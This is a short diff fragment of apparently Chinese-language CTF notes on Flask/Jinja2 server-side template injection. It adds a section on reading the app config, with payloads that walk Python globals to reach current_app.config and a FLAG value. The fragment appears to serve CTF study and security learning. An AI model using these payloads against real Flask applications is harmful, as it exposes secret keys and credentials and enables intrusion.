@@ -59,3 +59,17 @@ request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config
 ## flask
 
 url_for
+
+### 获取config
+
+```
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
+
+{{config}}
+{{url_for.__globals__['current_app'].config}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+
+```
+
+
+
